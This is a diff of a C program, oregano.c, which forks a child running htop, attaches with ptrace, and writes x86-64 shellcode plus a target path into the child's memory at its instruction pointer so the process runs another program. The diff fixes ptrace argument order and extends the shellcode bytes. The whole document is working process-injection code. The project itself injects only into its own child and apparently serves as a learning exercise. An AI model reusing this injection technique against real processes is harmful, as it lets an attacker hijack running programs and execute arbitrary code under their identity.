@@ -1,11 +1,11 @@
 // oregano.c
 // https://github.com/R-Rothrock/oregano
 
+//#include<stdio.h> // to be commented out on commit
+
 #define _GNU_SOURCE
 
-static char process_pathname[] = "a.out";
-static char *process_argv[] = {&process_pathname, 0};
-static char *process_envp[] = {0};
+static char process_pathname[] = "./test";
 
 #include<stdlib.h>
 #include<sys/ptrace.h> /* ptrace() */
@@ -21,7 +21,12 @@ static char *process_envp[] = {0};
   #define PTR_T u_int64_t
 
   static u_int8_t shellcode1[] = {0x48, 0xb8};
-  static u_int8_t shellcode2[] = {0x99, 0x50, 0x54, 0x5f, 0x52, 0x5e, 0x6a, 0x3b, 0x59, 0x0f, 0x05};
+  static u_int8_t shellcode2[] = {
+    0x99, 0x50, 0x54, 0x5f, 0x52,
+    0x5e, 0x6a, 0x3b, 0x58, 0x0f,
+    0x05, 0x48, 0x31, 0xff, 0x6a,
+    0x3c, 0x58, 0x0f, 0x05
+  };
 
 //#elif defined(__i836) // amd32
 //  #define OFFSET -1
@@ -42,18 +47,14 @@ static char *process_envp[] = {0};
   #error unsupported architecture
 #endif
 
-unsigned int get_file_size(char *pathname)
-{
-  struct stat stats;
-  stat(pathname, &stats);
-  return stats.st_size;
-}
-
 void child()
 {
-  char *child_argv[] = {"/usr/bin/htop", 0};
+  //printf("Child is executing...");
+  char *child_argv[] = {"/bin/htop", 0};
   char *child_envp[] = {0};
-  exit(execve(child_argv[0], child_argv, child_envp));
+  int ret = execve(child_argv[0], child_argv, child_envp);
+  //printf("Child finished execution");
+  exit(ret);
 }
 
 void attach(pid_t pid)
@@ -84,27 +85,41 @@ int main(int argc, char *argv[])
 
   attach(pid);
 
+  //perror("Status"); // to be commented out on commit
+
   PTR_T ip = get_ip_reg(pid);
+
+  //perror("Status"); // to be commented out on commit
 
   for(int i = 0; i < sizeof(shellcode1); i++)
   {
-    ptrace(PTRACE_POKETEXT, shellcode1[i], ip);
+    ptrace(PTRACE_POKETEXT, pid, ip, shellcode1[i]);
     ip++;
+
+    //perror("Status"); // to be commented out on commit
   }
+
+  //perror("Status"); // to be commented out on commit
 
   for(int i = 0; i < sizeof(process_pathname); i++)
   {
-    ptrace(PTRACE_POKETEXT, process_pathname[i], ip);
+    ptrace(PTRACE_POKETEXT, pid, ip, process_pathname[i]);
     ip++;
   }
+
+  //perror("Status"); // to be commented out on commit
 
   for(int i = 0; i < sizeof(shellcode2); i++)
   {
-    ptrace(PTRACE_POKETEXT, shellcode1[i], ip);
+    ptrace(PTRACE_POKETEXT, pid, ip, shellcode2[i]);
     ip++;
   }
 
-  ptrace(PTRACE_DETACH, 0, 0);
+  //perror("Status"); // to be commented out on commit
+
+  ptrace(PTRACE_DETACH, pid, 0, 0);
+
+  //perror("Status"); // to be commented out on commit
 
   return 0;
 }
